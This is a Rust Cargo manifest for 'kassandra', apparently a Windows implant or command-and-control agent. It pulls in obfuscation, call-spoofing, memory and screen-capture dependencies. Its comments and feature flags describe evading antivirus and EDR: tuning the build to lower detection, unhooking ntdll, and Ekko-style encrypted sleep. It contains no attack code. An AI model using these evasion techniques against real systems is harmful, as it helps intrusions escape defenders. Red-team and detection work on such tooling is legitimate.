[package]
name = "kassandra"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
once_cell = "1.19"
obfstr = "0.4"
busywork = { git = "https://github.com/PatchRequest/BusyWork", rev = "ed942d892f19ffda5e111874d7f2a255a59a8037" }
callghost = { git = "https://github.com/PatchRequest/CallGhost", rev = "4b50ab9131f9c8e42b1d4464dfe7054c19f56c81" }
serde = { version = "1.0", features = ["derive"] }
reqwest = { version = "0.12", default-features = false, features = ["blocking", "json", "rustls-tls"] }
serde_json = "1.0"
base64 = "0.22.1"
chrono = { version = "0.4", features = ["clock"] }
hmac = "0.12"
sha2 = "0.10"
hex = "0.4"
uuid = { version = "1", features = ["v4"] }
aes = "0.8"
getrandom = "0.2"
lazy_static = "1.5.0"
windows-sys = { version = "0.48", features = [
  "Win32_System_Threading",
  "Win32_Foundation",
] }
windows = { version = "0.61.1", features = ["Win32", "Win32_System", "Win32_System_Com", "Win32_System_Memory"] }
ntapi = "0.4.1"
winapi = { version = "0.3", features = [
    "minwindef",
    "ntdef",
    "processthreadsapi",
    "errhandlingapi",
    "winnt",
    "winbase",
    "lmcons",
    "heapapi",
    "memoryapi",
    "synchapi",
    "threadpoollegacyapiset",
    "sddl",
    "securitybaseapi",
    "handleapi",
    "windef",    # <- for HDC, HBITMAP etc.
    "wingdi",    # <- for BitBlt, CreateCompatibleDC, etc.
    "winuser",   # <- for GetDC, GetSystemMetrics, etc.
    "fileapi",
    "libloaderapi",
    "sysinfoapi"
] }
image = { version = "0.24", default-features = false, features = ["png", "ico"] }
tiny_http = "0.12"
zip = "0.6"

[profile.release]
strip = true
# LTO off on purpose: fat LTO + single CGU shrank the PE hard (~8.5→~4.4 MiB)
# but raised AV/EDR hit rates in lab. Prefer noisier/larger codegen over "clean"
# LTO'd layout. Size wins elsewhere if needed (deps/features), not here.
lto = false
panic = "abort"

[features]
default = []
tailscale = []
no_console = []
# Lab-only: write lifecycle diagnostics to %TEMP%\kassandra_debug.log
debug_log = []
# Strip EDR userland hooks from ntdll at startup (KnownDlls method)
unhook = []
# Ekko-style memory-encrypted sleep (timer-queue ROP + RC4 PE encryption)
ekko = []
